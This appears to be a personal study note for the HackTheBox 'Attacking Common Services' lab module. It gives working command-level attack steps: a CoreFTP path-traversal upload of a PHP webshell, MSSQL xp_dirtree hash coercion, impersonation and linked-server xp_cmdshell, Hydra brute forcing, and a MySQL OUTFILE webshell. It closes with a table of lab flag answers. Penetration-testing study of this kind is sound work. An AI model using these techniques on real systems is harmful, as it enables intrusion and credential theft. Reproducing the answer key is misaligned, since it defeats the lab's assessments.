# Attacking Common Services (HTB Supplementary)

#AttackingCommonServices #FTP #SMB #MSSQL #RDP #DNS #SMTP #POP3 #IMAP #CoreFTP #CVE202222836 #xpDirtree #UNCInjection #NetNTLMv2 #sqlcmd #MSSQLImpersonation #LinkedServer #subbrute #HydraFTP #HydraPOP3 #HydraSMTP #enum4linux #smbclientNull #HTBSupplementary

**HTB Attacking Common Services module**, supplementary reference for service-specific attack techniques not covered by existing vault notes. Tier 2, Medium difficulty. The existing vault covers enumeration of all these services (Footprinting.md FP.1-FP.8), Hydra for SSH/RDP/HTTP (Password Attacks.md 16.1), xp_cmdshell basics (FP.8), and PtH over RDP (PA.18). This note documents the attack-specific techniques that aren't there.

> 🔁 Cross-refs: [[Footprinting#FP.8. MSSQL|FP.8 MSSQL impacket-mssqlclient + xp_cmdshell]], [[Footprinting#FP.5. SMTP|FP.5 smtp-user-enum]], [[Footprinting#FP.6. IMAP / POP3|FP.6 IMAP openssl session]], [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 hashcat -m 5600]], [[Password Attacks (HTB Supplementary)#PA.18. Pass the Hash. Deep Dive|PA.18 xfreerdp /pth:]], [[Password Attacks (HTB Supplementary)#PA.5. MSF smb_login|PA.5 smb_login auxiliary]]

---

## CS.1. CoreFTP 725 — Directory Traversal (CVE-2022-22836)

CoreFTP Server before build 727 allows an authenticated attacker to write files outside the FTP root using `../` sequences in an HTTP PUT request over the CoreFTP HTTPS port (443 by default). The exploit writes a PHP webshell into the Apache `htdocs` directory.

**Step 1: verify CoreFTP is present and find the Apache directory**
```bash
# SearchSploit to find the exploit
searchsploit CoreFTP
# → CoreFTP Server build 725 - Directory Traversal (Authenticated) | windows/remote/50652.txt

# Read the exploit notes
searchsploit -x windows/remote/50652.txt
# Key line: PUT via https with ../ path as-is writes to arbitrary location
```

**Step 2: check WebServersInfo.txt if available — find Apache htdocs path**
```bash
cat WebServersInfo.txt
# Typical output:
# CoreFTP:
# Directory C:\CoreFTP
# Ports: 21 & 443
# Apache
# Directory "C:\xampp\htdocs\"
# Ports: 80 & 4443
```

**Step 3: write a PHP webshell to the Apache webroot via PUT traversal**
```bash
# Generate a random filename to avoid collisions
openssl rand -hex 16
# → 1af271ec0935f7ccbd31dc24666f7f33

# Upload the webshell (note: uses the CoreFTP HTTPS port, not FTP)
curl -k -X PUT \
  -H "Host: TARGET_IP" \
  --basic -u fiona:987654321 \
  --data-binary '<?php echo shell_exec($_GET["c"]);?>' \
  --path-as-is \
  https://TARGET_IP/../../../../../../xampp/htdocs/1af271ec0935f7ccbd31dc24666f7f33.php

# Expected response: HTTP/1.1 200 Ok  (success)
# If you see 550 or 500, try a different traversal depth
```

**Step 4: execute commands via the webshell (HTTP, not HTTPS)**
```bash
# Read a file (URL-encode backslashes with %5C or use %20 for spaces)
curl -w "\n" "http://TARGET_IP/1af271ec0935f7ccbd31dc24666f7f33.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt"

# Run whoami first to confirm code execution
curl -w "\n" "http://TARGET_IP/FILENAME.php?c=whoami"
# → win-easy\apache or nt authority\system (if XAMPP runs as system)

# List directory
curl -w "\n" "http://TARGET_IP/FILENAME.php?c=dir%20C:\\users\\administrator"
```

> 🔧 Technique: the `--path-as-is` flag to curl is critical. Without it, curl normalises the `../` sequences and the path traversal fails. The flag preserves the raw path string exactly as written. Also use the CoreFTP HTTPS port (443 or whatever was found) for the PUT, then HTTP (80) for the GET to the webshell, the two services are separate daemons.

> 🔧 Technique: the traversal depth (`/../../../../../../`) must reach the filesystem root and then back into `xampp\htdocs`. Count the depth of the CoreFTP web root from C:\ and add enough `../` to overshoot. More segments than needed is fine, the OS stops at the root.

> 🔍 Worth remembering generally: CoreFTP's HTTP server is a separate daemon running on port 443 that allows HTTPS file access to FTP shares. CVE-2022-22836 affects the PUT handler of this HTTP component, not the FTP protocol itself. The FTP credentials authenticate the PUT request, so you need FTP access first, then exploit the HTTP component.

> 🔁 Similar to: [[Common Web Application Attacks#13.1.3. Path Traversal|13.1.3 path traversal]] and [[Common Web Application Attacks#13.3. File Inclusion|13.3 file inclusion]]. Same traversal concept at the FTP-server level rather than web-application level.

#### Tags: #CoreFTP #CVE202222836 #PathTraversal #FileUpload #WebShell #HTTPS #PUT

---

## CS.2. MSSQL UNC Path Injection → NetNTLMv2 Capture

When you have a low-privilege MSSQL connection, you can coerce the MSSQL service account to authenticate to a Kali SMB share by making the server resolve a UNC path. This captures the service account's NetNTLMv2 hash without using Responder.

**Setup: impacket-smbserver as the capture listener**
```bash
# Terminal 1 (Kali) — start an SMB server
sudo impacket-smbserver share ./ -smb2support
# -smb2support = required for modern Windows targets; without it the auth fails silently
# Listens on port 445; save this terminal to watch for the hash

# Alternative: sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./ -smb2support
```

**Trigger: MSSQL queries that resolve UNC paths**

In the MSSQL session (impacket-mssqlclient or sqlcmd):
```sql
-- xp_dirtree: list directory contents — resolves the UNC path, triggering auth
EXEC master..xp_dirtree '\\KALI_IP\share'
go

-- xp_subdirs: alternative if xp_dirtree is unavailable
EXEC master..xp_subdirs '\\KALI_IP\share'
go
```

**Output — capture the hash in the smbserver terminal:**
```
[*] Incoming connection (10.129.203.12,49676)
[*] AUTHENTICATE_MESSAGE (WIN-02\mssqlsvc,WIN-02)
[*] User WIN-02\mssqlsvc authenticated successfully
[*] mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:da87f7aa577b48e8361cf1b021e6bfca:01010000...
```

The full hash string is everything from `mssqlsvc::WIN-02:...` to the end.

**Save and crack:**
```bash
# Save the hash
echo "mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:da87f7aa577b48e8361cf1b021e6bfca:01010000..." > hash.txt

# Crack with hashcat — mode 5600 = NetNTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
# → MSSQLSVC::WIN-02:...:princess1
```

> 🔍 Worth remembering generally: `xp_dirtree` requires `sysadmin` OR the public role (it's granted to public by default in many MSSQL installs). Even a very low-privilege SQL login can often trigger it. The captured account is the MSSQL service account (`mssqlsvc`, `NT SERVICE\MSSQLSERVER`, etc.) which often has elevated local Windows privileges.

> 🔧 Technique: this only works when the MSSQL server can reach your Kali machine over SMB (port 445). If there's a firewall between them, the UNC auth attempt is silently dropped. Confirm connectivity with `xp_cmdshell 'ping -n 1 KALI_IP'` first if you have cmdshell access, or check the smbserver output for any connection attempt (even a rejected one shows the target tried to reach you).

> 🔁 Similar to: [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3]] captures NetNTLMv2 via Responder (LLMNR/NBT-NS poisoning). This method coerces the same auth through the database, no network broadcast needed. Same hash format, same hashcat mode 5600.

#### Tags: #MSSQL #xpDirtree #UNCInjection #NetNTLMv2 #impacketSmbserver #HashCapture #NetNTLMv2

---

## CS.3. sqlcmd — Linux MSSQL Client

`sqlcmd` is Microsoft's official command-line tool for MSSQL, available on Linux. It's an alternative to `impacket-mssqlclient` with slightly different syntax.

```bash
# Install if not present
sudo apt install sqlcmd

# Connect to SQL Server (SQL auth — prompts for password)
sqlcmd -S TARGET_IP -U username
# Prompts: Password:

# Connect using Windows Auth (domain or local)
sqlcmd -S TARGET_IP -U DOMAIN\\username -E   # -E = trusted connection

# Connect to named instance
sqlcmd -S TARGET_IP\INSTANCENAME -U username

# Connect with -S using hostname (Windows Auth mode, inside RDP session)
sqlcmd -S WIN-HARD       # connects to local MSSQL instance using current Windows session
```

**Interactive session prompts**, sqlcmd doesn't use a `>` shell prompt; it uses line numbers:
```sql
1> SELECT name FROM sys.databases
2> go
-- Each statement ends with 'go' on its own line
-- Output appears immediately after 'go'

1> use flagDB
2> go
-- Changed database context to 'flagDB'.
```

> 🔧 Technique: every SQL statement in sqlcmd requires a `go` on its own line to execute. Without `go`, the statement just sits there accumulating more lines. Type `go` alone to run whatever you've typed since the last go. Type `exit` or `quit` to leave.

> 🔁 Similar to: [[Footprinting#FP.8. MSSQL|FP.8]] uses `impacket-mssqlclient` for the same purpose. sqlcmd is the Microsoft-native client; impacket-mssqlclient is the Impacket Python wrapper. sqlcmd is required when using Windows Authentication inside an RDP session (where your Windows identity is already set).

#### Tags: #sqlcmd #MSSQL #LinuxClient #WindowsAuth #SQLServerClient

---

## CS.4. MSSQL Database and Table Enumeration

Once connected to MSSQL (via sqlcmd or impacket-mssqlclient), enumerate databases and tables:

```sql
-- List all databases
SELECT name FROM sys.databases
go
-- Gives: master, tempdb, model, msdb, flagDB, ...

-- Switch to a database
use flagDB
go

-- List tables in the current database via INFORMATION_SCHEMA
SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
go
-- Returns: tb_flag (or whatever tables exist)

-- Dump all rows from a table
SELECT * FROM tb_flag
go

-- Query across databases without switching context
SELECT * FROM flagDB.dbo.tb_flag
go
```

> 🔍 Worth remembering generally: `INFORMATION_SCHEMA.TABLES` works in both MSSQL and MySQL (with different syntax). In MSSQL, prefix it with the database name: `flagDB.INFORMATION_SCHEMA.TABLES`. In MySQL, it's `INFORMATION_SCHEMA.TABLES` with `WHERE table_schema = 'flagDB'`. This is the universal pattern for discovering what tables exist before you know what to SELECT from.

> 🔁 Similar to: [[Footprinting#FP.8. MSSQL|FP.8]] shows the impacket-mssqlclient version of this query. [[SQL Injection Attacks]] covers the same INFORMATION_SCHEMA concept from a web-app injection angle.

#### Tags: #MSSQL #DatabaseEnum #INFORMATIONSCHEMA #TableEnum #SQLQuery

---

## CS.5. MSSQL Impersonation — EXECUTE AS LOGIN

MSSQL allows accounts to impersonate other logins if explicitly granted `IMPERSONATE` permission. This is a privilege escalation path: if your SQL login can impersonate a sysadmin, you effectively become a sysadmin.

**Step 1: enumerate who you can impersonate**
```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
    ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
go
-- Returns: john, simon (users who can be impersonated)
```

**Step 2: verify impersonation works and check privilege level**
```sql
-- Impersonate john
EXECUTE AS LOGIN = 'john'
go

-- Check current user and whether john is a sysadmin (1 = yes, 0 = no)
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')
go
-- → john    1    (john is sysadmin!)

-- Revert to original login when done
REVERT
go
```

**Step 3: use the impersonated sysadmin context to enable xp_cmdshell**
```sql
EXECUTE AS LOGIN = 'john'
go
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
go
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
go
EXEC xp_cmdshell 'whoami'
go
```

> 🔍 Worth remembering generally: `sys.server_permissions` with `permission_name = 'IMPERSONATE'` is the definitive query for this, not all MSSQL references document it clearly. The `grantor_principal_id` links to who **granted** the permission (the account that allowed impersonation), which is why you join to `sys.server_principals` on `grantor_principal_id`, not `grantee_principal_id`. Run this query on every MSSQL foothold before reaching for other privesc paths.

> 🔧 Technique: impersonation only works for server-level logins, not database users. If your account is a database user (not a server login), the `EXECUTE AS LOGIN` syntax won't work, you'd need `EXECUTE AS USER` instead. `sys.server_permissions` shows server-level grants.

#### Tags: #MSSQL #Impersonation #ExecuteAsLogin #PrivilegeEscalation #sysadmin #sys.server_permissions

---

## CS.6. MSSQL Linked Server Attacks

Linked servers are remote database connections configured on the MSSQL instance. They allow one SQL Server to query another. If the linked server's remote login has elevated privileges, you can escalate through it even without those privileges locally.

**Step 1: enumerate linked servers**
```sql
SELECT srvname, isremote FROM sysservers
go
-- Output:
-- srvname                           isremote
-- WINSRV02\SQLEXPRESS                1        ← remote server (no link)
-- LOCAL.TEST.LINKED.SRV              0        ← linked server (isremote 0)
```

`isremote = 0` = linked server (configured link). `isremote = 1` = remote server (ad-hoc connection, not a link).

**Step 2: test execution on the linked server (combine with impersonation if needed)**
```sql
-- Run from the john impersonation context (or directly if you're sysadmin)
EXECUTE AS LOGIN = 'john'
go

-- Execute a SELECT on the linked server to check identity and role
EXECUTE('SELECT @@servername, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
go
-- → WINSRV02\SQLEXPRESS    testadmin    1
-- (john connects as testadmin on the linked server and testadmin is sysadmin)
```

**Linked server query syntax:**
- `EXECUTE('SQL string') AT [SERVER.NAME]` — execute SQL on the linked server
- Single quotes inside the string must be escaped as `''` (two single quotes)
- The server name in brackets must exactly match the `srvname` from sysservers

**Step 3: enable xp_cmdshell on the linked server**
```sql
-- Enable advanced options and xp_cmdshell on the linked server
EXECUTE('EXECUTE sp_configure ''show advanced options'', 1; RECONFIGURE; EXECUTE sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
go
-- → Configuration option 'show advanced options' changed from 0 to 1.
-- → Configuration option 'xp_cmdshell' changed from 0 to 1.
```

**Step 4: execute OS commands via xp_cmdshell on the linked server**
```sql
-- Read a file on the linked server
EXECUTE('xp_cmdshell ''type C:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
go
-- → HTB{46u$!n9_l!nk3d_$3rv3r$}
-- → NULL
-- (NULL is normal — cmdshell always adds a NULL output row at the end)
```

**Quote escaping breakdown for nested EXECUTE:**
```
Outer EXECUTE( '...' )        → outer single quotes delimit the string passed to AT
  sp_configure ''option''     → '' inside the string = escaped single quote → 'option'
  xp_cmdshell ''command''     → '' = escaped quote → 'command'
```

So three levels of nesting need three levels of escaping:
```sql
-- Level 1: EXECUTE('...') AT [SERVER] — outer quotes
-- Level 2: sp_configure ''option''    — one level of escape
-- Level 3: xp_cmdshell ''type C:\...\flag.txt''  — same level
```

> 🔍 Worth remembering generally: linked server attacks are one of the most impactful MSSQL lateral movement paths. The access context on the linked server is determined by how the link was configured (the remote login mapping). A DBA who configured the link to use `sa` on the remote side means anyone who can reach that linked server effectively has remote `sa`. Always enumerate linked servers immediately after getting any MSSQL access.

> 🔧 Technique: the server name in `AT [SERVER.NAME]` is case-sensitive and must match `srvname` from `sysservers` exactly, including dots and backslashes. If the name has a backslash (e.g. `WINSRV02\SQLEXPRESS`), include it literally in the brackets: `AT [WINSRV02\SQLEXPRESS]`.

> 🔁 Similar to: [[Footprinting#FP.8. MSSQL|FP.8]] covers xp_cmdshell locally. Linked server attacks extend this to remote execution through the database's inter-server trust relationships.

#### Tags: #MSSQL #LinkedServer #sysservers #ExecuteAt #xpCmdshell #NestedQuotes #LateralMovement

---

## CS.7. DNS Subdomain Brute Force — subbrute

subbrute uses a wordlist to brute-force DNS subdomains against a specific resolver (nameserver), rather than relying on public resolvers. Useful when the target nameserver holds internal/private DNS records not visible externally.

```bash
# Clone subbrute
git clone https://github.com/TheRook/subbrute.git
cd subbrute/

# Write the target nameserver into resolvers.txt (replaces the default public resolvers)
echo TARGET_IP > resolvers.txt

# Run subdomain brute force (use SecLists DNS wordlist if available)
python3 subbrute.py inlanefreight.htb \
  -s /opt/useful/SecLists/Discovery/DNS/namelist.txt \
  -r resolvers.txt

# Alternative wordlist if SecLists isn't at /opt/useful:
python3 subbrute.py inlanefreight.htb \
  -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -r resolvers.txt
```

Output example:
```
inlanefreight.htb
helpdesk.inlanefreight.htb
hr.inlanefreight.htb
ns.inlanefreight.htb
```

**Follow up: zone transfer each discovered subdomain and grep for TXT records:**
```bash
# AXFR from the target nameserver
dig axfr hr.inlanefreight.htb @TARGET_IP

# Grep for TXT records specifically (often contain flags or internal notes)
dig axfr hr.inlanefreight.htb @TARGET_IP | grep "TXT"
# → hr.inlanefreight.htb.  604800  IN  TXT  "HTB{LUIHNFAS2871SJK1259991}"
```

> 🔍 Worth remembering generally: subbrute differs from tools like `gobuster dns` in that it uses configurable resolvers, so you point it at the target nameserver. This is important when the target runs split-horizon DNS (internal records only visible via the internal NS, not through 8.8.8.8). In those cases, public resolvers return NXDOMAIN for everything even though subdomains exist internally.

> 🔁 Similar to: [[Information Gathering#6.4.1. DNS Enumeration|6.4.1 DNS enumeration]] uses dnsenum and dig for zone transfers. subbrute adds the brute-force step for subdomain discovery before the transfer.

#### Tags: #DNS #subbrute #SubdomainBruteForce #ZoneTransfer #AXFR #SplitHorizon #TXTRecord

---

## CS.8. Email Service Attacks — Hydra SMTP/POP3 + nc POP3 Session

### CS.8.1. Hydra SMTP with Full Email Address Username

SMTP authentication sometimes uses the full email address format for the username, not just the local part. The `-l` format must include `@domain`:

```bash
# Brute-force SMTP auth with full email address (found via smtp-user-enum first)
hydra -l marlin@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://TARGET_IP -f

# -f = stop on first valid pair found
# → [25][smtp] host: TARGET_IP   login: marlin@inlanefreight.htb   password: poohbear
```

### CS.8.2. Hydra POP3 Brute Force

```bash
# Brute-force POP3 with a custom password list (e.g. from anonymous FTP download)
hydra -l simon -P mynotes.txt pop3://TARGET_IP

# Or with a standard wordlist
hydra -l user -P /usr/share/wordlists/rockyou.txt pop3://TARGET_IP
# → [110][pop3] host: TARGET_IP   login: simon   password: 8Ns8j1b!23hs4921smHzwn
```

### CS.8.3. nc/telnet POP3 Manual Session

For reading email via POP3 without a mail client, use netcat or telnet directly:

```bash
nc -nv TARGET_IP 110
# or: telnet TARGET_IP 110
```

POP3 session commands (one line at a time):
```
+OK Dovecot (Ubuntu) ready.
user simon                     ← send username (local part only, not @domain)
+OK
pass 8Ns8j1b!23hs4921smHzwn   ← send password
+OK Logged in.
list                           ← list messages (index + size)
+OK 1 messages:
1 1630
.
retr 1                         ← retrieve message 1 (full headers + body)
+OK 1630 octets
... (email content with flag, SSH key, etc.) ...
.
quit                           ← close the session
```

> 🔧 Technique: the POP3 username for `user` command is the local part only (`simon`, not `simon@domain.htb`), even if Hydra needed the full email format. The two formats are used differently: SMTP AUTH needs the full address, POP3 USER needs just the local part.

> 🔧 Technique: if an SSH private key is in the email body (printed by `retr`), copy it carefully from the raw `retr` output. The terminal will show it with spaces where the key has line breaks. Use the sed trick from the module: `echo 'BEGIN... full key ... END' | sed 's/ /\n/g' > id_rsa` to restore line breaks, or manually paste and fix the header/footer to be on single lines.

> 🔁 Similar to: [[Footprinting#FP.6. IMAP / POP3|FP.6]] covers IMAP and POP3S (encrypted) via openssl s_client with IMAP tag-command syntax. This section covers cleartext POP3 on port 110 via nc, which is simpler for unencrypted mailboxes on lab targets.

#### Tags: #SMTP #POP3 #Hydra #HydraSMTP #HydraPOP3 #ncPOP3 #ManualSession #EmailBruteForce

---

## CS.9. SMB Enumeration + Anonymous Access

### CS.9.1. enum4linux — Share Enumeration with R/W Detection

```bash
# Full enum4linux run (user, group, share, password policy enumeration)
enum4linux TARGET_IP
```

Key output section to check:
```
 ========================================= 
|    Share Enumeration on TARGET_IP       |
 ========================================= 

    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    GGJ             Disk      Priv
    IPC$            IPC       IPC Service (...)

[+] Attempting to map shares on TARGET_IP
//TARGET/print$    Mapping: DENIED, Listing: N/A    ← no access
//TARGET/GGJ       Mapping: OK, Listing: OK          ← READ (and potentially WRITE)
```

`Mapping: OK, Listing: OK` = the anonymous/null session can access and list the share. Shares with this are worth connecting to.

### CS.9.2. smbclient Null Session — List and Browse Shares

```bash
# List all shares with null authentication (-N = no password)
smbclient -N -L //TARGET_IP
# or
smbclient -N -L TARGET_IP

# Connect to a specific share anonymously
smbclient -N //TARGET_IP/Home

# Connect with credentials
smbclient -U DOMAIN\\jason //TARGET_IP/GGJ
# Prompts: Enter WORKGROUP\jason's password:
```

### CS.9.3. smbclient Commands — Navigation and Bulk Download

Inside an smbclient session:
```
smb: \> ls                   ← list current directory
smb: \> dir                  ← same as ls
smb: \> cd IT\               ← change to subdirectory (use backslash)
smb: \> cd IT\Fiona\         ← nested path with backslash
smb: \> get creds.txt        ← download single file
smb: \> cd ../Simon\         ← parent directory navigation
smb: \> get random.txt
smb: \> prompt               ← toggle interactive mode (off = no per-file prompts)
smb: \> mget *               ← download all files in current directory
smb: \> exit
```

> 🔧 Technique: `cd` in smbclient uses backslash (`\`) as the path separator, not forward slash. `cd IT/Fiona` won't work; `cd IT\Fiona\` will. The trailing backslash helps on some server implementations.

> 🔧 Technique: `prompt` + `mget *` is the pattern for grabbing everything from a directory without confirming each file. Always turn off prompt before `mget` on a large directory or it'll ask Y/N for every file.

> 🔁 Similar to: [[Footprinting#FP.2. SMB|FP.2]] covers rpcclient null session for domain/user enumeration. smbclient null session is for share *access*, actually reading files, which rpcclient can't do.

#### Tags: #SMB #enum4linux #smbclientNull #NullSession #ShareEnum #mget #prompt

---

## CS.10. Hydra FTP Thread Throttling

Some FTP servers (Core FTP in particular) rate-limit connections and return 550 errors when too many threads hammer them simultaneously. The fix is to reduce Hydra's parallelism:

```bash
# Standard Hydra FTP (may get 550 errors on throttled servers)
hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP

# Throttled — 1 task at a time
hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP -u -t 1
# -t 1 = 1 task (thread) per server
# -u = loop user before password (iterate users first, then passwords)
# Much slower (74 tries/min vs normal 1000+) but avoids 550 throttle errors
```

> 🔍 Worth remembering generally: most Hydra brute forces fail silently when the server is throttling. Hydra just sees a bad response and marks the attempt as failed without telling you it's being rate-limited. If Hydra finishes quickly with no valid result on a service that should be vulnerable, try adding `-t 1` (or `-t 4`) and re-running. The slowdown is often the difference between getting a result and getting nothing.

#### Tags: #Hydra #FTP #ThreadThrottle #RateLimit #-t1 #BruteForce

---

## CS.11. Skills Assessment: Easy Chain

**Target profile:** Windows host with FTP (21), SMTP (25), HTTP (80), CoreFTP HTTPS (443), SMTP (587), MySQL (3306). Domain: `inlanefreight.htb`.

**Attack chain:**
```
Nmap → smtp-user-enum RCPT → fiona@inlanefreight.htb valid
→ Hydra FTP fiona -t 1 → fiona:987654321
→ FTP login → get docs.txt WebServersInfo.txt
→ WebServersInfo.txt reveals: Apache at C:\xampp\htdocs\, CoreFTP HTTPS on 443
→ searchsploit CoreFTP → CVE-2022-22836 (50652.txt)
→ curl PUT traversal → PHP webshell in htdocs
→ curl GET webshell → type C:\users\administrator\desktop\flag.txt
→ HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```

**Alternative path (MySQL webshell):**
```
Hydra FTP → fiona:987654321
→ mysql -u fiona -p987654321 -h TARGET_IP
→ show variables like "secure_file_priv"; → empty (unrestricted)
→ SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';
→ curl GET shell.php → type administrator\desktop\flag.txt
```

Key commands:
```bash
# SMTP user enum
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t TARGET_IP

# Hydra FTP with throttle
hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP -u -t 1

# FTP connect + download
ftp TARGET_IP
# login fiona:987654321
# get docs.txt
# get WebServersInfo.txt

# searchsploit
searchsploit CoreFTP
searchsploit -m windows/remote/50652.txt

# CoreFTP PUT webshell (replace filename and credentials)
curl -k -X PUT -H "Host: TARGET_IP" --basic -u fiona:987654321 \
  --data-binary '<?php echo shell_exec($_GET["c"]);?>' \
  --path-as-is https://TARGET_IP/../../../../../../xampp/htdocs/RANDOMNAME.php

# Read flag via webshell
curl -w "\n" "http://TARGET_IP/RANDOMNAME.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt"
```

---

## CS.12. Skills Assessment: Medium Chain

**Target profile:** Linux host with SSH (22), DNS (53), SMB (139/445), and hidden FTP on port 30021 under a vHost. Domain: `inlanefreight.htb`.

**Attack chain:**
```
Nmap → DNS port 53 open
→ dig AXFR inlanefreight.htb @TARGET → reveals int-ftp.inlanefreight.htb (127.0.0.1)
→ Add "TARGET_IP int-ftp.inlanefreight.htb" to /etc/hosts
→ Nmap int-ftp.inlanefreight.htb → port 30021 ProFTPD
→ ftp int-ftp.inlanefreight.htb 30021 → anonymous login accepted
→ ls → simon/ directory
→ get mynotes.txt → 8 candidate passwords
→ hydra -l simon -P mynotes.txt pop3://TARGET_IP → simon:8Ns8j1b!23hs4921smHzwn
→ nc -nv TARGET_IP 110 → user simon / pass / list / retr 1
→ Email body contains SSH private key (-----BEGIN OPENSSH PRIVATE KEY-----)
→ Save key: echo 'KEY ONE LINE' | sed 's/ /\n/g' > id_rsa
→ chmod 600 id_rsa
→ ssh -i id_rsa simon@TARGET_IP → simon@lin-medium
→ cat flag.txt → HTB{1qay2wsx3EDC4rfv_M3D1UM}
```

Key commands:
```bash
# Zone transfer
dig AXFR inlanefreight.htb @TARGET_IP

# Add vHost
sudo sh -c 'echo "TARGET_IP int-ftp.inlanefreight.htb" >> /etc/hosts'

# Nmap vHost for hidden port
nmap -p- -T4 int-ftp.inlanefreight.htb

# Anonymous FTP on non-standard port
ftp int-ftp.inlanefreight.htb 30021
# anonymous / anything@email.com

# Hydra POP3
hydra -l simon -P mynotes.txt pop3://TARGET_IP

# POP3 session
nc -nv TARGET_IP 110
# user simon → pass 8Ns8j1b!23hs4921smHzwn → list → retr 1

# Save SSH key (key was in email with spaces instead of newlines)
echo 'BEGIN ... key body ... END' | sed 's/ /\n/g' > id_rsa
chmod 600 id_rsa
ssh -i id_rsa simon@TARGET_IP
cat flag.txt
```

> 🔍 Worth remembering generally: DNS zone transfers often reveal internal service vHosts (like `int-ftp`, `int-nfs`, `ws1`, etc.) that map to loopback (127.0.0.1) or internal IPs. When a record maps to 127.0.0.1, it means the service is on the same machine as the DNS server. After adding the vHost to `/etc/hosts`, run a fresh full-port Nmap scan on the vHost to find non-standard ports the primary scan may have missed.

---

## CS.13. Skills Assessment: Hard Chain

**Target profile:** Windows host. SMB (445), MSSQL (1433), RDP (3389). Domain: `WIN-HARD`.

**Attack chain:**
```
Nmap → SMB + MSSQL + RDP
→ smbclient -N -L TARGET → Home share accessible (null session)
→ smbclient -N //TARGET/Home → IT/ HR/ OPS/ Projects/
→ cd IT\Fiona\ → get creds.txt
→ cd IT\Simon\ → get random.txt
→ cd IT\John\ → mget * → information.txt, notes.txt, secrets.txt
→ cat creds.txt secrets.txt random.txt > passwords.txt
→ cme smb TARGET -u fiona -p passwords.txt → fiona:48Ns72!bns74@S84NNNSl (Pwn3d!)
→ xfreerdp /v:TARGET /u:fiona /p:'48Ns72!bns74@S84NNNSl'
→ In RDP: PowerShell → SQLCMD.EXE -S WIN-HARD (Windows Auth)
→ SELECT ... FROM sys.server_permissions WHERE IMPERSONATE → john, simon
→ EXECUTE AS LOGIN = 'john'
→ SELECT srvname, isremote FROM sysservers → LOCAL.TEST.LINKED.SRV (isremote 0)
→ EXECUTE('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
   → testadmin, 1 (sysadmin on linked server)
→ EXECUTE('EXECUTE sp_configure ''show advanced options'', 1; RECONFIGURE; EXECUTE sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
→ EXECUTE('xp_cmdshell ''more C:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
→ HTB{46u$!n9_l!nk3d_$3rv3r$}
```

Key commands:
```bash
# SMB null session
smbclient -N -L TARGET_IP
smbclient -N //TARGET_IP/Home

# SMB password spray
sudo cme smb TARGET_IP -u fiona -p passwords.txt

# RDP
xfreerdp /v:TARGET_IP /u:fiona /p:'48Ns72!bns74@S84NNNSl'
```

Inside RDP (PowerShell):
```sql
-- Connect to local MSSQL (Windows Auth uses current session)
SQLCMD.EXE -S WIN-HARD

-- Who can be impersonated?
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
go

-- Impersonate john + check linked servers
EXECUTE AS LOGIN = 'john'
go
SELECT srvname, isremote FROM sysservers
go

-- Test linked server access
EXECUTE('SELECT @@servername, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
go

-- Enable xp_cmdshell on linked server
EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
go

-- Read the flag
EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
go
```

---

## CS.14. All Q&A Answers

| Section | Q | Answer |
|---|---|---|
| Attacking FTP Q1 | FTP service port? | **2121** |
| Attacking FTP Q2 | Available FTP username? | **robin** |
| Attacking FTP Q3 | flag.txt contents via SSH as robin? | **HTB{ATT4CK1NG_F7P_53RV1C3}** |
| Attacking SMB Q1 | Share with READ and WRITE permissions? | **GGJ** |
| Attacking SMB Q2 | Password for user "jason"? | **34c8zuNBo91!@28Bszh** |
| Attacking SMB Q3 | flag.txt via SSH as jason? | **HTB{SMB_4TT4CKS_2349872359}** |
| Attacking SQL Databases Q1 | Password for "mssqlsvc"? | **princess1** |
| Attacking SQL Databases Q2 | Flag in "flagDB" database? | **HTB{!l0v3#4$#!n9_4nd_r3$p0nd3r}** |
| Attacking RDP Q1 | File on Desktop? | **pentest-notes.txt** |
| Attacking RDP Q2 | Registry key for PtH over RDP? | **DisableRestrictedAdmin** |
| Attacking RDP Q3 | flag.txt via RDP as Administrator (PtH)? | **HTB{RDP_P4$$_Th3_H4$#}** |
| Attacking DNS Q1 | Flag in DNS TXT record? | **HTB{LUIHNFAS2871SJK1259991}** |
| Attacking Email Services Q1 | Available SMTP username? | **marlin** |
